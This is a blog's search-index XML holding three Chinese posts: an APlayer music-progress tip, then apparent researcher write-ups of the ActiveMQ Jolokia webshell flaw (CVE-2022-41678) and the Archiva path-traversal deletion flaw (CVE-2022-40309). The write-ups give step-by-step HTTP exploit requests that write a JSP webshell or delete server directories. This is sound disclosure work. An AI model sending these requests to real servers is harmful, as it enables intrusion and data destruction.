<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>APlayer 跳转页面保持音乐播放进度</title>
    <url>/2020/04/29/APlayer-%E8%B7%B3%E8%BD%AC%E9%A1%B5%E9%9D%A2%E4%BF%9D%E6%8C%81%E9%9F%B3%E4%B9%90%E6%92%AD%E6%94%BE%E8%BF%9B%E5%BA%A6/</url>
    <content><![CDATA[<p>想给博客加个音频播放的插件作为背景音乐，但是在博客内跳转的时候音乐会中断并重新加载，参考了网易云音乐网页版的解决办法就是所有页面都在前端通过Ajax动态加载，并不会跳转网页，所以音乐播放不会中断。但是改Hexo源码的话不太可行，想到一个办法就是每次跳转前记录进度并在下次加载网页时读取</p>
<span id="more"></span>

<p>添加APlayer部分参考<a href="https://asdfv1929.github.io/2018/05/26/next-add-music/">Hexo NexT主题中添加网页音乐播放器功能</a></p>
<p>后来发现个很好用的插件<a href="https://github.com/metowolf/MetingJS">MetingJS</a>，可以直接解析网易云音乐等各网络平台的歌曲</p>
<p>在 themes&#x2F;next&#x2F;layout&#x2F;_layout.swig 添加</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- require APlayer --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- require MetingJS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;opacity:0.7&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meting-js</span></span></span><br><span class="line"><span class="tag">        <span class="attr">server</span>=<span class="string">&quot;netease&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">type</span>=<span class="string">&quot;playlist&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">id</span>=<span class="string">&quot;2486559481&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">fixed</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">volume</span>=<span class="string">&quot;0.3&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">order</span>=<span class="string">&quot;random&quot;</span></span></span><br><span class="line"><span class="tag">        &gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">meting-js</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>id对应歌单，其他配置项详见文档</p>
<p><img src="/APlayer-%E8%B7%B3%E8%BD%AC%E9%A1%B5%E9%9D%A2%E4%BF%9D%E6%8C%81%E9%9F%B3%E4%B9%90%E6%92%AD%E6%94%BE%E8%BF%9B%E5%BA%A6/image-20200429222458927.png" alt="image-20200429222458927"></p>
<p>然后要获取APlayer对象来控制音乐播放，<code>document.querySelector(&#39;meting-js&#39;).aplayer</code>，在浏览器控制台可以成功获取，但写在HTML源码中就无法获得，应该是执行该代码时meting还未来得及初始化aplayer对象，后来试了很多办法，终于解决，即监听对象值的变化</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ap = <span class="literal">null</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;meting-js&#x27;</span>),<span class="string">&quot;aplayer&quot;</span>,&#123;</span><br><span class="line">    <span class="attr">set</span>: <span class="keyword">function</span>(<span class="params">aplayer</span>) &#123;</span><br><span class="line">        ap=aplayer</span><br><span class="line">        <span class="title function_">ready</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ready</span>(<span class="params"></span>)&#123;</span><br><span class="line">    ap.<span class="property">list</span>.<span class="title function_">switch</span>(<span class="number">0</span>);</span><br><span class="line">    ap.<span class="title function_">play</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还有个小坑：<a href="https://www.jarviswang.me/?p=889">HTML5中Audio元素在chrome中自动播放报错Uncaught (in promise) DOMException的解决方法</a></p>
<p>最后完整添加到 themes&#x2F;next&#x2F;layout&#x2F;_layout.swig 的代码如下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- require APlayer --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- require MetingJS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;opacity:0.7&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meting-js</span></span></span><br><span class="line"><span class="tag">        <span class="attr">server</span>=<span class="string">&quot;netease&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">type</span>=<span class="string">&quot;playlist&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">id</span>=<span class="string">&quot;2486559481&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">fixed</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">volume</span>=<span class="string">&quot;0.3&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">order</span>=<span class="string">&quot;random&quot;</span></span></span><br><span class="line"><span class="tag">        &gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">meting-js</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    ap = <span class="literal">null</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;meting-js&#x27;</span>),<span class="string">&quot;aplayer&quot;</span>,&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">set</span>: <span class="keyword">function</span>(<span class="params">aplayer</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            ap=aplayer</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">ready</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    isRecover = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">ready</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        ap.<span class="title function_">on</span>(<span class="string">&#x27;canplay&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span>(!isRecover)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span>(<span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&quot;musicIndex&quot;</span>) != <span class="literal">null</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                    musicIndex = <span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&quot;musicIndex&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                    musicTime = <span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&quot;musicTime&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span>(ap.<span class="property">list</span>.<span class="property">index</span> != musicIndex)&#123;</span></span><br><span class="line"><span class="language-javascript">                        ap.<span class="property">list</span>.<span class="title function_">switch</span>(musicIndex);</span></span><br><span class="line"><span class="language-javascript">                    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-javascript">                        ap.<span class="title function_">seek</span>(musicTime);</span></span><br><span class="line"><span class="language-javascript">                        ap.<span class="title function_">play</span>();</span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">localStorage</span>.<span class="title function_">clear</span>();</span></span><br><span class="line"><span class="language-javascript">                        isRecover = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-javascript">                    isRecover = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="property">onbeforeunload</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>(!ap.<span class="property">audio</span>.<span class="property">paused</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            musicIndex = ap.<span class="property">list</span>.<span class="property">index</span>;</span></span><br><span class="line"><span class="language-javascript">            musicTime = ap.<span class="property">audio</span>.<span class="property">currentTime</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;musicIndex&quot;</span>,musicIndex);</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;musicTime&quot;</span>,musicTime);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>












<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://asdfv1929.github.io/2018/05/26/next-add-music/">Hexo NexT主题中添加网页音乐播放器功能</a></p>
<p><a href="https://aplayer.js.org/">APlayer</a></p>
<p><a href="https://github.com/metowolf/MetingJS">MetingJS</a></p>
]]></content>
      <tags>
        <tag>APlayer</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache ActiveMQ Jolokia 远程代码执行漏洞(CVE-2022-41678)分析</title>
    <url>/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>ActiveMQ中，经过身份验证的用户默认情况下可以通过<code>/api/jolokia/</code>接口操作MBean，其中FlightRecorder可以被用于写Jsp WebShell，从而造成远程代码执行漏洞</p>
<p>FlightRecorder存在于Jdk 11+，具体类名：<code>jdk.management.jfr.FlightRecorderMXBeanImpl</code></p>
<span id="more"></span>

<p>这个漏洞是我去年通过微步的X漏洞奖励计划提交的，今天看到已经被修复和公开了，就顺便写一下分析文章</p>
<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
<li>Apache ActiveMQ before 5.16.6</li>
<li>Apache ActiveMQ 5.17.0 before 5.17.4</li>
<li>Apache ActiveMQ 5.18.0 unaffected</li>
<li>Apache ActiveMQ 6.0.0 unaffected</li>
</ul>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>漏洞入口在 <a href="http://localhost:8161/api/jolokia/">http://localhost:8161/api/jolokia/</a> ，注意需要带上Origin头才可以访问</p>
<p><img src="/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/image-20220730133512058.png" alt="image-20220730133512058"></p>
<p>主要问题出在FlightRecorder这个Mbean，功能是记录内存，gc，调用栈等，漏洞用到的方法主要是以下几个</p>
<ul>
<li>newRecording<ul>
<li>新建记录</li>
</ul>
</li>
<li>setConfiguration<ul>
<li>更改配置</li>
</ul>
</li>
<li>startRecording<ul>
<li>开始录制</li>
</ul>
</li>
<li>stopRecording<ul>
<li>结束录制</li>
</ul>
</li>
<li>copyTo<ul>
<li>导出录制文件</li>
</ul>
</li>
</ul>
<p>漏洞思路是通过setConfiguration修改配置，把一些键名改成jsp代码，记录的数据就会包含该jsp代码，录制完成后，通过copyTo导出到web目录即可</p>
<p>代码位置在 jdk.management.jfr.FlightRecorderMXBeanImpl#setConfiguration </p>
<h3 id="拿到默认配置"><a href="#拿到默认配置" class="headerlink" title="拿到默认配置"></a>拿到默认配置</h3><p>调用setPredefinedConfiguration，断点停下来后可以拿到默认的配置，先保存下来</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/jolokia/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8161</span><br><span class="line">Origin:localhost:8161</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Basic YWRtaW46YWRtaW4=</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>155</span><br><span class="line"></span><br><span class="line"><span class="language-prolog">&#123;</span></span><br><span class="line"><span class="language-prolog">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;jdk.management.jfr:type=FlightRecorder&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;setPredefinedConfiguration&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">    <span class="string">&quot;arguments&quot;</span>: [<span class="number">1</span>,<span class="string">&quot;s&quot;</span>]</span></span><br><span class="line"><span class="language-prolog">&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/image-20220730134739877.png" alt="image-20220730134739877"></p>
<h3 id="新建记录"><a href="#新建记录" class="headerlink" title="新建记录"></a>新建记录</h3><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/jolokia/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8161</span><br><span class="line">Origin:localhost:8161</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Basic YWRtaW46YWRtaW4=</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>136</span><br><span class="line"></span><br><span class="line"><span class="language-prolog">&#123;</span></span><br><span class="line"><span class="language-prolog">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;jdk.management.jfr:type=FlightRecorder&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;newRecording&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">    <span class="string">&quot;arguments&quot;</span>: []</span></span><br><span class="line"><span class="language-prolog">&#125;</span></span><br></pre></td></tr></table></figure>

<p>记录的id 为 1，后面poc都要使用这个id</p>
<p><img src="/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/image-20220730134939126.png" alt="image-20220730134939126"></p>
<h3 id="更改配置"><a href="#更改配置" class="headerlink" title="更改配置"></a>更改配置</h3><p>将默认配置的如下处改为jsp代码，特殊字符需要实体编码</p>
<p><img src="/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/image-20220730135355053.png" alt="image-20220730135355053"></p>
<p>如下 arguments 的第一位参数是记录id，第二个参数是配置内容（很长，已省略）</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/jolokia/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8161</span><br><span class="line">Origin:localhost:8161</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Basic YWRtaW46YWRtaW4=</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>31263</span><br><span class="line"></span><br><span class="line"><span class="language-prolog">&#123;</span></span><br><span class="line"><span class="language-prolog">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;jdk.management.jfr:type=FlightRecorder&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;setConfiguration&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">    <span class="string">&quot;arguments&quot;</span>: [<span class="number">1</span>,<span class="string">&quot;...&quot;</span>]</span></span><br><span class="line"><span class="language-prolog">&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/image-20220730135515477.png" alt="image-20220730135515477"></p>
<h3 id="导出录制到web目录"><a href="#导出录制到web目录" class="headerlink" title="导出录制到web目录"></a>导出录制到web目录</h3><p>开始录制</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/jolokia/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8161</span><br><span class="line">Origin:localhost:8161</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Basic YWRtaW46YWRtaW4=</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>141</span><br><span class="line"></span><br><span class="line"><span class="language-prolog">&#123;</span></span><br><span class="line"><span class="language-prolog">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;jdk.management.jfr:type=FlightRecorder&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;startRecording&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">    <span class="string">&quot;arguments&quot;</span>: [<span class="number">1</span>]</span></span><br><span class="line"><span class="language-prolog">&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/image-20220730135551581.png" alt="image-20220730135551581"></p>
<p>结束录制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/jolokia/ HTTP/1.1</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Origin:localhost:8161</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4=</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 138</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;type&quot;: &quot;EXEC&quot;,</span><br><span class="line">    &quot;mbean&quot;: &quot;jdk.management.jfr:type=FlightRecorder&quot;,</span><br><span class="line">    &quot;operation&quot;: &quot;stopRecording&quot;,</span><br><span class="line">    &quot;arguments&quot;: [1]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/image-20220730135637118.png" alt="image-20220730135637118"></p>
<p>导出到web目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/jolokia/ HTTP/1.1</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Origin:localhost:8161</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4=</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 159</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;type&quot;: &quot;EXEC&quot;,</span><br><span class="line">    &quot;mbean&quot;: &quot;jdk.management.jfr:type=FlightRecorder&quot;,</span><br><span class="line">    &quot;operation&quot;: &quot;copyTo&quot;,</span><br><span class="line">    &quot;arguments&quot;: [1,&quot;../webapps/admin/test.jsp&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/image-20220730135719277.png" alt="image-20220730135719277"></p>
<h3 id="访问webshell"><a href="#访问webshell" class="headerlink" title="访问webshell"></a>访问webshell</h3><p><a href="http://localhost:8161/admin/test.jsp">http://localhost:8161/admin/test.jsp</a></p>
<p><img src="/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/image-20231129175943787.png" alt="image-20231129175943787"></p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><a href="https://github.com/apache/activemq/commit/6120169e5">https://github.com/apache/activemq/commit/6120169e5</a></p>
]]></content>
      <tags>
        <tag>漏洞分析</tag>
        <tag>ActiveMQ</tag>
        <tag>Jolokia</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Archiva 任意目录删除(CVE-2022-40309) 和 任意文件读取(CVE-2022-40308)</title>
    <url>/2022/12/24/Apache-Archiva-%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95%E5%88%A0%E9%99%A4-CVE-2022-40309-%E5%92%8C-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-CVE-2022-40308/</url>
    <content><![CDATA[<p>Apache Archiva是一个存储库管理软件，2.2.9以下版本在删除或者下载Artifact时，可以在目录或者文件名中注入目录穿越符，导致任意目录删除&#x2F;任意文件读取漏洞。</p>
<span id="more"></span>

<h2 id="CVE-2022-40309"><a href="#CVE-2022-40309" class="headerlink" title="CVE-2022-40309"></a>CVE-2022-40309</h2><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><ul>
<li>Apache Archiva &lt; 2.2.9</li>
</ul>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><a href="https://archive.apache.org/dist/archiva/2.2.8/binaries/apache-archiva-2.2.8-bin.zip">https://archive.apache.org/dist/archiva/2.2.8/binaries/apache-archiva-2.2.8-bin.zip</a></p>
<p><a href="https://codeload.github.com/apache/archiva/zip/refs/tags/archiva-2.2.8">https://codeload.github.com/apache/archiva/zip/refs/tags/archiva-2.2.8</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./bin/archiva console</span><br></pre></td></tr></table></figure>

<p>or</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.\bin\archiva.bat console</span><br></pre></td></tr></table></figure>



<p>可以提前在<code>conf/wrapper.conf</code>添加如下配置，方便IDEA远程调试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wrapper.java.additional.9=-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005</span><br></pre></td></tr></table></figure>



<p>首次运行需要添加Admin用户，注意需要勾选<code>Validated</code>复选框：</p>
<p><a href="http://127.0.0.1:8080/#open-admin-create-box">http://127.0.0.1:8080/#open-admin-create-box</a></p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>前置条件是需要用户拥有<code>archiva-delete-artifact</code>操作权限，使用首次添加的系统管理员账号或者角色为<code>Repository Manager - internal</code>的账号都可，其次需要存储库中有<code>Artifact</code></p>
<p>先上传一个<code>Artifact</code>到<code>Archiva Managed Internal Repository</code></p>
<p><img src="/Apache-Archiva-%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95%E5%88%A0%E9%99%A4-CVE-2022-40309-%E5%92%8C-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-CVE-2022-40308/image-20221224112101909.png" alt="image-20221224112101909"></p>
<p>保存之后文件会储存在<code>repositories/internal/com/test/test/1.0/test-1.0.jar</code></p>
<p>在<code>/#browse</code>页面点进<code>group</code>然后删除<code>project</code>时抓包，如果此页面为空的话可以重启一下Archiva</p>
<p><img src="/Apache-Archiva-%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95%E5%88%A0%E9%99%A4-CVE-2022-40309-%E5%92%8C-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-CVE-2022-40308/image-20221224114016618.png" alt="image-20221224114016618"></p>
<p>可以抓到如下DELETE请求</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">DELETE /restServices/archivaServices/repositoriesService/project/internal/com.test/test</span><br></pre></td></tr></table></figure>

<p>在<code>projectid</code>后面添加POC<code>%2f..%2f..%2f..%2f..%2f..%2fdata</code>，这将删除Archiva根目录下的<code>data</code>目录</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">DELETE /restServices/archivaServices/repositoriesService/project/internal/com.test/test%2f..%2f..%2f..%2f..%2f..%2fdata</span><br></pre></td></tr></table></figure>



<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>入口在 org.apache.archiva.rest.api.services.RepositoriesService#deleteProject</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Path</span> (<span class="string">&quot;project/&#123;repositoryId&#125;/&#123;groupId&#125;/&#123;projectId&#125;&quot;</span>)</span><br><span class="line"><span class="meta">@DELETE</span></span><br><span class="line"><span class="meta">@Produces</span> (&#123; MediaType.APPLICATION_JSON, MediaType.APPLICATION_XML, MediaType.TEXT_PLAIN &#125;)</span><br><span class="line"><span class="meta">@RedbackAuthorization</span> (noPermission = <span class="literal">true</span>)</span><br><span class="line">Boolean <span class="title function_">deleteProject</span><span class="params">( <span class="meta">@PathParam</span> (<span class="string">&quot;groupId&quot;</span>)</span> String groupId, <span class="meta">@PathParam</span> (<span class="string">&quot;projectId&quot;</span>) String projectId,</span><br><span class="line">                       <span class="meta">@PathParam</span> (<span class="string">&quot;repositoryId&quot;</span>) String repositoryId )</span><br><span class="line">    <span class="keyword">throws</span> ArchivaRestServiceException;</span><br></pre></td></tr></table></figure>

